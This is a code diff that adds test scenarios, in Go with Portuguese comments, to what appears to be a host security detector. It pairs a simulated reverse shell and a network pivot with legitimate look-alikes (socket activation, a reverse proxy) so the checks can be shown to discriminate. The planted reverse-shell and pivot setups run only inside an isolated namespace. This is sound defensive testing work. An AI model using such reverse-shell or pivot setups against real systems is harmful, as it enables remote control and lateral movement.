@@ -111,6 +111,98 @@ func init() {
 		MustBeComplete: true,
 	})
 
+	// ------------------------------------------------------------------- rede
+	//
+	// Os quatro cenários abaixo existem em pares: uma forma que precisa
+	// disparar e a forma LEGÍTIMA quase idêntica que não pode. É o par que dá
+	// valor — sozinho, o positivo não prova que o check discrimina.
+	//
+	// Endereço público sem rede: `--network=none` mais apelidos em `lo`. Para
+	// quem classifica, 51.91.190.241 é público; para a máquina, nada sai do
+	// namespace.
+
+	Register(Scenario{
+		ID:       "40-revshell",
+		Desc:     "fd 0, 1 e 2 no mesmo socket, saindo para endereço público",
+		Images:   minimal,
+		NetAdmin: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			/helper listen 51.91.190.241:9001 &
+			sleep 0.4
+			/helper revshell 51.91.190.241:9001 &
+			sleep 0.5`,
+		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
+		// O outro lado da conexão está no mesmo host e no mesmo namespace: o
+		// processo que ESCUTA não pode ser lido como pivô nem como shell.
+		Forbid:         []string{"net.pivot"},
+		Exit:           2,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:   "41-socket-activation-nao-eh-revshell",
+		Desc: "ativação por socket tem a MESMA forma e não pode disparar",
+		// O falso positivo que a revisão de código encontrou. systemd com
+		// StandardInput=socket e inetd entregam o socket em fd 0, 1 e 2 — igual
+		// a um shell reverso. O que separa é a DIREÇÃO, e este cenário é o que
+		// impede alguém de "simplificar" o check removendo essa checagem.
+		//
+		// Roda na matriz inteira e sem privilégio de rede: loopback basta,
+		// porque o que está sob teste é a direção, não o escopo do peer.
+		Images: matriz,
+		Plant: `/helper accept 127.0.0.1:9002 &
+			sleep 0.4
+			/helper connect 127.0.0.1:9002 &
+			sleep 0.5`,
+		Forbid:         []string{"correlate.revshell", "net.pivot"},
+		Exit:           0,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:       "42-pivot",
+		Desc:     "mesmo processo com saída externa e saída interna: a VM é caminho",
+		Images:   minimal,
+		NetAdmin: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 10.0.0.9/32 dev lo
+			/helper listen 51.91.190.241:9001 &
+			/helper listen 10.0.0.9:9002 &
+			sleep 0.4
+			/helper connect 51.91.190.241:9001 10.0.0.9:9002 &
+			sleep 0.5`,
+		Expect: []Expect{{ID: "net.pivot", Sev: "WARN"}},
+		// Sem dup2 sobre os descritores padrão não há assinatura de shell: os
+		// dois checks olham a mesma tabela e não podem se confundir.
+		Forbid:         []string{"correlate.revshell"},
+		Exit:           1,
+		MustBeComplete: true,
+	})
+
+	Register(Scenario{
+		ID:   "43-proxy-reverso-nao-eh-pivo",
+		Desc: "proxy reverso fala com os dois lados e NÃO é pivô",
+		// O defeito que a revisão encontrou no check: sem direção, todo nginx
+		// que serve tráfego público virava pivô. A diferença é inteira aqui —
+		// tráfego externo de ENTRADA, não de saída.
+		Images:   minimal,
+		NetAdmin: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 10.0.0.9/32 dev lo
+			/helper listen 10.0.0.9:9002 &
+			sleep 0.3
+			/helper proxy 51.91.190.241:9001 10.0.0.9:9002 &
+			sleep 0.3
+			/helper connect 51.91.190.241:9001 &
+			sleep 0.5`,
+		Forbid:         []string{"net.pivot", "correlate.revshell"},
+		Exit:           0,
+		MustBeComplete: true,
+	})
+
 	// ---------------------------------------------------------------- modo image
 
 	Register(Scenario{
